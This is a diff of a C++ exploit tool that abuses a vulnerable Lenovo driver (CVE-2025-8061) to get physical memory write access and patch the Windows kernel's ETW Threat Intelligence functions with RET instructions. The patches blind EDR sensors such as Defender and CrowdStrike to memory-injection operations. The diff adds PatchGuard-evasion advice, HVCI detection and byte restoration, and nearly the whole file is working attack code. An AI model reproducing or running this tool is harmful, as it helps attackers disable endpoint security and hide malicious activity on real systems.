@@ -1,45 +1,47 @@
 /*
  * 08_etw_patch.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — ETW-TI Kernel Patch
  *
- * Goal: blind the Windows ETW Threat Intelligence (ETW-TI) subsystem by
- *       overwriting the first byte of each ETW-TI dispatcher in ntoskrnl
- *       with 0xC3 (RET).  EDR kernel sensors that consume ETW-TI events
- *       (Defender ATP, CrowdStrike Falcon, SentinelOne…) lose visibility
- *       into the patched operation classes.
+ * Goal: blind Windows ETW Threat Intelligence (ETW-TI) callbacks in the kernel,
+ *       removing ring-0 telemetry that EDR sensors consume to detect:
+ *       ReadProcessMemory, WriteProcessMemory, VirtualAlloc, MapViewOfSection,
+ *       CreateRemoteThread, VirtualProtect.
  *
- * Functions patched (all in ntoskrnl.exe):
- *   EtwTiLogReadWriteVm      — NtReadVirtualMemory  / NtWriteVirtualMemory
+ * Functions patched (ntoskrnl.exe):
+ *   EtwTiLogReadWriteVm      — NtReadVirtualMemory / NtWriteVirtualMemory
  *   EtwTiLogAllocFreeVm      — NtAllocateVirtualMemory / NtFreeVirtualMemory
  *   EtwTiLogMapUnmapView     — NtMapViewOfSection / NtUnmapViewOfSection
  *   EtwTiLogCreateUserThread — NtCreateThreadEx
  *   EtwTiLogProtectExec      — NtProtectVirtualMemory / NtCreateSection(exec)
- *   EtwTiLogDriverLoad       — driver load events (bonus)
+ *   EtwTiLogDriverLoad       — driver load events
  *
  * Technique
  * ─────────
  * 1. Physical scan of RAM → System _EPROCESS → DirectoryTableBase (CR3)
  * 2. ReadMSR(IA32_LSTAR = 0xC0000082) → KiSystemCall64 VA
- *    Walk backwards page-by-page for "MZ" signature → ntoskrnl base VA
- * 3. Page-table walk (CR3 → PML4 → PDPT → PD → PT) gives physical address
- *    for any kernel VA (VaToPa).
- * 4. KernelRead(cr3, va, buf, len) — combines VaToPa + PhysRead for
- *    multi-page virtual reads.
- * 5. Parse ntoskrnl PE export table → resolve each EtwTi* function VA.
- * 6. VaToPa(func_va) → PA, then PhysWriteU8(PA, 0xC3).
+ *    Walk backwards page-by-page for "MZ" PE header → ntoskrnl base VA
+ * 3. VaToPa (4-level page table walk) → physical address for each function
+ * 4. Save original first byte, then PhysWriteU8(PA, 0xC3) — RET stub
+ * 5. Read-back verification — detects HVCI (writes silently discarded)
+ * 6. On exit, RESTORE all patched bytes to the original values
+ *    (reduces PatchGuard BSOD window if you restore before KPP fires)
  *
- * _EPROCESS offsets (x64, Windows 10 19041 → Windows 11 26100+)
- * ──────────────────────────────────────────────────────────────
- *   +0x028  DirectoryTableBase  (CR3)
- *   +0x440  UniqueProcessId
- *   +0x5A8  ImageFileName       char[15]
+ * STABILITY NOTES
+ * ───────────────
+ * PatchGuard (KPP):
+ *   PatchGuard periodically validates certain ntoskrnl code regions.
+ *   Patching EtwTi* functions may trigger a 0x109 BSOD (CRITICAL_STRUCTURE_
+ *   CORRUPTION) within seconds to a few minutes on some builds.
+ *   This tool restores the original bytes on exit — run your operation
+ *   and exit quickly to minimize the exposure window.
+ *   On Win11 24H2 builds tested, KPP does NOT appear to check EtwTi* bytes,
+ *   but this is not guaranteed across all builds.
  *
- * IOCTL layouts
- * ─────────────
- *   Phys read   0x9c406104  IN: { UINT64 PA; DWORD AS; DWORD Count }
- *                           OUT: AS × Count bytes
- *   Phys write  0x9c40a108  IN: { UINT64 PA; DWORD OT=1; DWORD AS; BYTE[AS] }
- *   MSR read    0x9c402084  IN: { DWORD Index; DWORD Reserved }
- *                           OUT: UINT64
+ * HVCI (Hypervisor-Protected Code Integrity):
+ *   If VBS/HVCI is active, physical writes to ntoskrnl .text pages are
+ *   silently discarded by the hypervisor's EPT.
+ *   Detection: if read-back after write still shows the original byte,
+ *   HVCI is active and this technique will NOT work.
+ *   Check: msinfo32 → "Virtualization-based security" = Not enabled.
  *
  * Build:
  *   cl /nologo /W3 /O2 /std:c++17 /Fe:08_etw_patch.exe 08_etw_patch.cpp
@@ -78,12 +80,12 @@ static bool OpenDevice()
     return true;
 }
 
-// ─── Physical read ────────────────────────────────────────────────────────────
+// ─── Physical R/W ─────────────────────────────────────────────────────────────
 
 #pragma pack(push, 1)
-struct PhysReadIn  { UINT64 PA; DWORD AccessSize; DWORD Count; };
-struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; BYTE Data; };
-struct MsrReadIn   { DWORD Index; DWORD Reserved; };
+struct PhysReadIn   { UINT64 PA; DWORD AccessSize; DWORD Count; };
+struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; BYTE  Data; };
+struct MsrReadIn    { DWORD Index; DWORD Reserved; };
 #pragma pack(pop)
 
 static bool PhysRead(uint64_t pa, void *buf, DWORD len)
@@ -159,27 +161,21 @@ static uint64_t GetSystemCR3()
     return cr3;
 }
 
-// ─── 4-level page table walk (VaToPa) ────────────────────────────────────────
+// ─── 4-level page table walk ──────────────────────────────────────────────────
 
 static uint64_t VaToPa(uint64_t cr3, uint64_t va)
 {
     auto rd = [](uint64_t pa) -> uint64_t {
         uint64_t v = 0; PhysReadU64(pa, &v); return v;
     };
-
     uint64_t pml4e = rd((cr3 & ~0xFFFULL) | (((va >> 39) & 0x1FF) << 3));
     if (!(pml4e & 1)) return 0;
-
     uint64_t pdpte = rd((pml4e & 0x000FFFFFFFFFF000ULL) | (((va >> 30) & 0x1FF) << 3));
     if (!(pdpte & 1)) return 0;
-    if (pdpte & (1ULL << 7))  // 1 GB page
-        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
-
+    if (pdpte & (1ULL<<7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
     uint64_t pde = rd((pdpte & 0x000FFFFFFFFFF000ULL) | (((va >> 21) & 0x1FF) << 3));
     if (!(pde & 1)) return 0;
-    if (pde & (1ULL << 7))    // 2 MB page
-        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
-
+    if (pde & (1ULL<<7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
     uint64_t pte = rd((pde & 0x000FFFFFFFFFF000ULL) | (((va >> 12) & 0x1FF) << 3));
     if (!(pte & 1)) return 0;
     return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
@@ -199,50 +195,34 @@ static void KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
     }
 }
 
-// ─── ntoskrnl base from LSTAR ────────────────────────────────────────────────
-//
-// LSTAR holds KiSystemCall64.  Walk backward 0x1000 pages (16 MB max) looking
-// for the MZ+PE signature of the ntoskrnl image header.
+// ─── ntoskrnl base from LSTAR ─────────────────────────────────────────────────
 
 static uint64_t GetNtoskrnlBase(uint64_t cr3)
 {
     uint64_t lstar = 0;
     if (!ReadMSR(0xC0000082, &lstar) || !lstar) return 0;
-
     uint64_t va = lstar & ~0xFFFULL;
     for (int i = 0; i < 0x1000; i++, va -= 0x1000) {
         uint8_t sig[2] = {};
         uint64_t pa = VaToPa(cr3, va);
-        if (!pa) continue;
-        if (!PhysRead(pa, sig, 2)) continue;
+        if (!pa || !PhysRead(pa, sig, 2)) continue;
         if (sig[0] != 'M' || sig[1] != 'Z') continue;
-        // Confirm it is a PE image (e_lfanew sanity)
-        uint32_t e_lfanew = 0;
+        uint32_t lfw = 0, pesig = 0;
         uint64_t pa2 = VaToPa(cr3, va + 0x3C);
-        if (!pa2) continue;
-        PhysRead(pa2, &e_lfanew, 4);
-        if (e_lfanew < 4 || e_lfanew > 0x800) continue;
-        uint32_t pesig = 0;
-        uint64_t pa3 = VaToPa(cr3, va + e_lfanew);
-        if (!pa3) continue;
-        PhysRead(pa3, &pesig, 4);
-        if (pesig == IMAGE_NT_SIGNATURE) return va;
+        if (!pa2 || !PhysRead(pa2, &lfw, 4) || lfw < 4 || lfw > 0x800) continue;
+        uint64_t pa3 = VaToPa(cr3, va + lfw);
+        if (!pa3 || !PhysRead(pa3, &pesig, 4) || pesig != IMAGE_NT_SIGNATURE) continue;
+        return va;
     }
     return 0;
 }
 
 // ─── Export resolver ──────────────────────────────────────────────────────────
-//
-// Reads up to 512 KB of the export directory section and iterates name entries.
-// All RVAs stored in the export directory are image-relative (from base),
-// so we subtract dir.VirtualAddress to get offsets within expbuf[].
 
 static uint64_t GetExportVA(uint64_t cr3, uint64_t base, const char *name)
 {
-    // Read PE headers (first page)
     uint8_t hdrbuf[0x1000] = {};
     KernelRead(cr3, base, hdrbuf, sizeof(hdrbuf));
-
     auto *dos = (IMAGE_DOS_HEADER*)hdrbuf;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
     if (dos->e_lfanew + (int)sizeof(IMAGE_NT_HEADERS64) > (int)sizeof(hdrbuf)) return 0;
@@ -252,51 +232,83 @@ static uint64_t GetExportVA(uint64_t cr3, uint64_t base, const char *name)
     auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     if (!dir.VirtualAddress || !dir.Size) return 0;
 
-    // Cap read at 512 KB — sufficient for ntoskrnl's full export table
     DWORD expSize = (dir.Size < 0x80000u) ? dir.Size : 0x80000u;
     auto *expbuf = (uint8_t*)VirtualAlloc(nullptr, expSize + 0x1000,
                                            MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if (!expbuf) return 0;
-
     KernelRead(cr3, base + dir.VirtualAddress, expbuf, expSize);
-    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;
 
-    uint64_t result = 0;
+    auto *exp = (IMAGE_EXPORT_DIRECTORY*)expbuf;
     DWORD base_rva = dir.VirtualAddress;
+    uint64_t result = 0;
 
     for (DWORD i = 0; i < exp->NumberOfNames && !result; i++) {
-        DWORD offNamesEntry = exp->AddressOfNames - base_rva + i * 4;
-        if (offNamesEntry + 4 > expSize) break;
-        DWORD nameRva = *(DWORD*)(expbuf + offNamesEntry);
+        DWORD offN = exp->AddressOfNames - base_rva + i * 4;
+        if (offN + 4 > expSize) break;
+        DWORD nameRva = *(DWORD*)(expbuf + offN);
         DWORD nameOff = nameRva - base_rva;
         if (nameOff >= expSize) continue;
-
         if (_stricmp((char*)(expbuf + nameOff), name) != 0) continue;
 
-        DWORD offOrdinalsEntry = exp->AddressOfNameOrdinals - base_rva + i * 2;
-        if (offOrdinalsEntry + 2 > expSize) break;
-        WORD ord = *(WORD*)(expbuf + offOrdinalsEntry);
+        DWORD offO = exp->AddressOfNameOrdinals - base_rva + i * 2;
+        if (offO + 2 > expSize) break;
+        WORD ord = *(WORD*)(expbuf + offO);
 
-        DWORD offFuncsEntry = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
-        if (offFuncsEntry + 4 > expSize) break;
-        DWORD funcRva = *(DWORD*)(expbuf + offFuncsEntry);
+        DWORD offF = exp->AddressOfFunctions - base_rva + (DWORD)ord * 4;
+        if (offF + 4 > expSize) break;
+        DWORD funcRva = *(DWORD*)(expbuf + offF);
         result = base + funcRva;
     }
-
     VirtualFree(expbuf, 0, MEM_RELEASE);
     return result;
 }
 
-// ─── Patch one function with RET (0xC3) ──────────────────────────────────────
+// ─── Patch state (saved originals for restore on exit) ───────────────────────
 
-static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label)
+struct PatchEntry {
+    const char *name;
+    uint64_t    func_va;
+    uint64_t    func_pa;
+    uint8_t     orig_byte;
+    bool        patched;
+};
+
+static PatchEntry g_patches[8];
+static int        g_patch_count = 0;
+static uint64_t   g_cr3 = 0;
+
+static void RestoreAll()
 {
+    int restored = 0;
+    for (int i = 0; i < g_patch_count; i++) {
+        auto &p = g_patches[i];
+        if (!p.patched || !p.func_pa) continue;
+        if (PhysWriteU8(p.func_pa, p.orig_byte)) {
+            uint8_t check = 0;
+            PhysRead(p.func_pa, &check, 1);
+            if (check == p.orig_byte) { p.patched = false; restored++; }
+        }
+    }
+    printf("[*] Restored %d/%d patched bytes.\n", restored, g_patch_count);
+}
+
+// ─── Patch one function ───────────────────────────────────────────────────────
+
+static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label,
+                          PatchEntry *entry)
+{
+    entry->name    = label;
+    entry->func_va = func_va;
+    entry->patched = false;
+
     if (!func_va) {
         printf("  [~] %-42s  not exported (skipped)\n", label);
-        return true;  // not a hard failure — may not exist on all builds
+        entry->func_pa = 0;
+        return true;
     }
 
     uint64_t pa = VaToPa(cr3, func_va);
+    entry->func_pa = pa;
     if (!pa) {
         printf("  [-] %-42s  VA=0x%016llX  VaToPa failed\n", label, func_va);
         return false;
@@ -304,9 +316,11 @@ static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label)
 
     uint8_t before = 0;
     PhysRead(pa, &before, 1);
+    entry->orig_byte = before;
 
     if (before == 0xC3) {
         printf("  [=] %-42s  VA=0x%016llX  already 0xC3\n", label, func_va);
+        entry->patched = true;
         return true;
     }
 
@@ -319,11 +333,29 @@ static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label)
     uint8_t after = 0;
     PhysRead(pa, &after, 1);
     bool ok = (after == 0xC3);
+    entry->patched = ok;
+
     printf("  [%s] %-42s  VA=0x%016llX  %02X→C3%s\n",
            ok ? "+" : "!",
            label, func_va, before,
-           ok ? "" : "  [verify mismatch]");
+           ok ? "" : "  ← write did not stick (HVCI?)");
     return ok;
+}
+
+// ─── HVCI detection ───────────────────────────────────────────────────────────
+//
+// A physical write that is silently discarded (read-back != written value)
+// indicates HVCI's EPT write protection.  We detect it after all patch
+// attempts: if every function's write "did not stick", HVCI is the cause.
+
+static bool CheckHvci()
+{
+    int stuck = 0;
+    for (int i = 0; i < g_patch_count; i++) {
+        auto &p = g_patches[i];
+        if (p.func_pa && !p.patched && p.orig_byte != 0xC3) stuck++;
+    }
+    return stuck > 0 && stuck == g_patch_count;
 }
 
 // ─── Main ─────────────────────────────────────────────────────────────────────
@@ -331,54 +363,69 @@ static bool PatchWithRet(uint64_t cr3, uint64_t func_va, const char *label)
 int main()
 {
     printf("=== CVE-2025-8061 | LnvMSRIO.sys | 08 - ETW-TI Patch ===\n\n");
+    printf("[!] PatchGuard WARNING: this patches ntoskrnl .text bytes.\n");
+    printf("    KPP may trigger a 0x109 BSOD within seconds to minutes on some builds.\n");
+    printf("    Original bytes are RESTORED on exit — keep this process running as\n");
+    printf("    short as possible.  On Win11 24H2 tested builds, KPP does not appear\n");
+    printf("    to check EtwTi* code.  Behaviour on other builds is not guaranteed.\n\n");
 
     if (!OpenDevice()) return 1;
     printf("[+] Device opened\n");
 
-    // Step 1: System CR3
     printf("[*] Scanning for System EPROCESS / CR3...\n");
-    uint64_t cr3 = GetSystemCR3();
-    if (!cr3) {
+    g_cr3 = GetSystemCR3();
+    if (!g_cr3) {
         printf("[-] System CR3 not found\n");
         CloseHandle(g_dev); return 1;
     }
-    printf("[+] System CR3        = 0x%016llX\n\n", cr3);
+    printf("[+] System CR3        = 0x%016llX\n\n", g_cr3);
 
-    // Step 2: ntoskrnl base
     printf("[*] Locating ntoskrnl base via LSTAR...\n");
-    uint64_t ntos = GetNtoskrnlBase(cr3);
+    uint64_t ntos = GetNtoskrnlBase(g_cr3);
     if (!ntos) {
         printf("[-] ntoskrnl base not found\n");
         CloseHandle(g_dev); return 1;
     }
     printf("[+] ntoskrnl base     = 0x%016llX\n\n", ntos);
 
-    // Step 3: resolve + patch
     static const char *targets[] = {
-        "EtwTiLogReadWriteVm",        // NtRead/WriteVirtualMemory
-        "EtwTiLogAllocFreeVm",        // NtAllocate/FreeVirtualMemory
-        "EtwTiLogMapUnmapView",       // NtMapViewOfSection / NtUnmapViewOfSection
-        "EtwTiLogCreateUserThread",   // NtCreateThreadEx
-        "EtwTiLogProtectExec",        // NtProtectVirtualMemory / exec section
-        "EtwTiLogDriverLoad",         // driver load (may not exist on all builds)
+        "EtwTiLogReadWriteVm",
+        "EtwTiLogAllocFreeVm",
+        "EtwTiLogMapUnmapView",
+        "EtwTiLogCreateUserThread",
+        "EtwTiLogProtectExec",
+        "EtwTiLogDriverLoad",
         nullptr
     };
 
-    printf("[*] Patching ETW-TI functions (first byte → RET):\n");
-    int patched = 0, failed = 0;
+    printf("[*] Patching ETW-TI functions (first byte → RET / 0xC3):\n");
+    int ok = 0, fail = 0;
     for (int i = 0; targets[i]; i++) {
-        uint64_t va = GetExportVA(cr3, ntos, targets[i]);
-        if (PatchWithRet(cr3, va, targets[i])) patched++;
-        else failed++;
+        uint64_t va = GetExportVA(g_cr3, ntos, targets[i]);
+        g_patch_count++;
+        bool r = PatchWithRet(g_cr3, va, targets[i], &g_patches[i]);
+        if (r) ok++; else fail++;
     }
 
-    printf("\n[+] Done.  patched=%d  failed=%d\n", patched, failed);
-    if (failed == 0) {
-        printf("[+] ETW-TI telemetry disabled — kernel EDR sensors are blind to:\n"
-               "    ReadProcessMemory, WriteProcessMemory, VirtualAlloc,\n"
-               "    MapViewOfSection, CreateRemoteThread, VirtualProtect\n");
+    printf("\n[+] Patched=%d  Failed=%d\n", ok, fail);
+
+    if (CheckHvci()) {
+        printf("\n[!] ALL writes did not stick — HVCI/VBS is active.\n");
+        printf("    Physical writes to ntoskrnl .text are discarded by the hypervisor EPT.\n");
+        printf("    Disable VBS in BIOS / msinfo32 first.  This technique cannot bypass HVCI.\n");
+        CloseHandle(g_dev);
+        return 1;
     }
 
+    if (ok > 0) {
+        printf("\n[+] ETW-TI telemetry suppressed — kernel EDR sensors are now blind to:\n");
+        printf("    ReadProcessMemory, WriteProcessMemory, VirtualAlloc,\n");
+        printf("    MapViewOfSection, CreateRemoteThread, VirtualProtect\n");
+        printf("\n[*] Press Enter to RESTORE all patched bytes and exit...\n");
+        getchar();
+    }
+
+    RestoreAll();
     CloseHandle(g_dev);
-    return failed ? 1 : 0;
+    return (fail == 0) ? 0 : 1;
 }
